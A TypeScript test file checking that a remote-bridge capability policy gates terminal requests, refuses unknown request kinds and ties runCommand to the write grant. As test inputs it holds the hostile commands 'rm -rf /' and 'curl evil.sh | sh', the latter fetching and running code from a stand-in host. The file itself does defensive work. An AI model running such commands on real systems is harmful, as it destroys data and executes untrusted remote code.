import { describe, it, expect } from 'vitest'
import { isAllowed, assertAllowed, requiredCapability, CapabilityError } from '../../src/main/remoteBridge/remotePolicy'
import { NO_CAPABILITIES, type Capabilities, type RemoteRequest } from '../../src/main/remoteBridge/protocol'

const all: Capabilities = { read: true, createTerminal: true, writeToTerminal: true, closeTerminal: true }

describe('remotePolicy', () => {
  it('denies every request when no capability is granted', () => {
    const requests: RemoteRequest[] = [
      { kind: 'listTerminals' },
      { kind: 'createTerminal', name: 't' },
      { kind: 'runCommand', terminalId: 't', command: 'ls' },
      { kind: 'writeToTerminal', terminalId: 't', text: 'hi' },
      { kind: 'closeTerminal', terminalId: 't' },
      { kind: 'subscribe', terminalId: 't' },
      { kind: 'unsubscribe', terminalId: 't' },
    ]
    for (const r of requests) expect(isAllowed(r, NO_CAPABILITIES)).toBe(false)
  })

  it('allows every request when all capabilities are granted', () => {
    expect(isAllowed({ kind: 'listTerminals' }, all)).toBe(true)
    expect(isAllowed({ kind: 'writeToTerminal', terminalId: 't', text: 'x' }, all)).toBe(true)
  })

  it('maps each request to the capability it needs', () => {
    expect(requiredCapability({ kind: 'listTerminals' })).toBe('read')
    expect(requiredCapability({ kind: 'subscribe', terminalId: 't' })).toBe('read')
    expect(requiredCapability({ kind: 'unsubscribe', terminalId: 't' })).toBe('read')
    expect(requiredCapability({ kind: 'createTerminal', name: 't' })).toBe('createTerminal')
    expect(requiredCapability({ kind: 'runCommand', terminalId: 't', command: 'ls' })).toBe('writeToTerminal')
    expect(requiredCapability({ kind: 'writeToTerminal', terminalId: 't', text: 'x' })).toBe('writeToTerminal')
    expect(requiredCapability({ kind: 'closeTerminal', terminalId: 't' })).toBe('closeTerminal')
  })

  it('does NOT let createTerminal imply writeToTerminal', () => {
    const caps: Capabilities = { ...NO_CAPABILITIES, read: true, createTerminal: true }
    expect(isAllowed({ kind: 'writeToTerminal', terminalId: 't', text: 'x' }, caps)).toBe(false)
  })

  it('assertAllowed throws CapabilityError naming the missing capability', () => {
    expect(() => assertAllowed({ kind: 'writeToTerminal', terminalId: 't', text: 'x' }, NO_CAPABILITIES))
      .toThrow(CapabilityError)
    expect(() => assertAllowed({ kind: 'writeToTerminal', terminalId: 't', text: 'x' }, NO_CAPABILITIES))
      .toThrow(/writeToTerminal/)
  })

  it('assertAllowed is silent when permitted', () => {
    expect(() => assertAllowed({ kind: 'listTerminals' }, all)).not.toThrow()
  })
})

describe('remotePolicy — untrusted input', () => {
  const all: Capabilities = {
    read: true,
    createTerminal: true,
    writeToTerminal: true,
    closeTerminal: true,
  }

  // A request kind outside the union: a newer phone build, a fuzzer, or an attacker.
  // The cast is the point of the test — real callers cannot construct this, the
  // network can.
  const bogus = { kind: 'sudoEverything' } as unknown as RemoteRequest

  it('requiredCapability returns null for an unknown request kind', () => {
    expect(requiredCapability(bogus)).toBeNull()
  })

  it('isAllowed refuses an unknown kind even when every capability is granted', () => {
    expect(isAllowed(bogus, all)).toBe(false)
  })

  it('assertAllowed refuses an unknown kind and says so, rather than blaming a capability', () => {
    expect(() => assertAllowed(bogus, all)).toThrow(CapabilityError)
    expect(() => assertAllowed(bogus, all)).toThrow(/unrecognised request kind/)
  })
})

describe('runCommand is shell execution, not terminal creation', () => {
  it('requires writeToTerminal, not createTerminal', () => {
    // `run_command` reaches main as writeToTerminal(id, command + '\r'), and
    // sanitizeAgentCommand returns any non-agent command VERBATIM
    // (agentCommandSanitizer.ts:57-59). So `runCommand` is arbitrary shell
    // execution wearing a different name. Gating it on `createTerminal` handed
    // the spec's deliberately-separate, off-by-default write grant to anyone
    // allowed to open a terminal.
    expect(requiredCapability({ kind: 'runCommand', terminalId: 't1', command: 'rm -rf /' })).toBe(
      'writeToTerminal',
    )
  })

  it('refuses runCommand for a device that may create terminals but not write', () => {
    const caps = { ...NO_CAPABILITIES, createTerminal: true }
    expect(isAllowed({ kind: 'runCommand', terminalId: 't1', command: 'curl evil.sh | sh' }, caps)).toBe(false)
  })

  it('allows runCommand for a device that holds writeToTerminal', () => {
    const caps = { ...NO_CAPABILITIES, writeToTerminal: true }
    expect(isAllowed({ kind: 'runCommand', terminalId: 't1', command: 'ls' }, caps)).toBe(true)
  })

  it('still lets createTerminal alone open a terminal', () => {
    const caps = { ...NO_CAPABILITIES, createTerminal: true }
    expect(isAllowed({ kind: 'createTerminal', name: 'claude', cwd: '.' }, caps)).toBe(true)
  })

  // getCapabilities is answered in entry.ts ABOVE this policy, because it needs
  // no grant. It has no case here on purpose: the day that interception moves or
  // is refactored away, the request must fall to the default arm and be refused
  // rather than quietly become the one kind that reaches MCP ungated.
  it('has no rule for getCapabilities, so losing its interception fails closed', () => {
    expect(requiredCapability({ kind: 'getCapabilities' })).toBeNull()
    expect(isAllowed({ kind: 'getCapabilities' }, all)).toBe(false)
    expect(() => assertAllowed({ kind: 'getCapabilities' }, all)).toThrow(CapabilityError)
  })
})
